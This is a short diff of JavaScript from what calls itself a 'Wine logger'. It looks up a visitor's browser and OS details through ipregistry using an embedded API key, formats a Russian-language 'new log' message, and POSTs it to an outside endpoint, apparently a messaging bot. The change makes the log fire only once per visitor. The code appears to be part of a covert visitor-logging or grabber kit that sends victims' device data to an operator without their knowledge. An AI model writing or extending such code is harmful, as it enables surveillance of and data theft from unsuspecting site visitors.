@@ -120,7 +120,8 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let namebrowser = engine.name;
   let osnam = data.os.name;
   let osvers = data.os.version;
-      
+
+if (!localStorage.getItem('logSent')) {
             const message = `
 *🍷 Новый лог от Wine logger*
 
@@ -179,6 +180,7 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
         fetch(url, {
             method: 'POST',
             body: formData
+            
         });
       });
     });
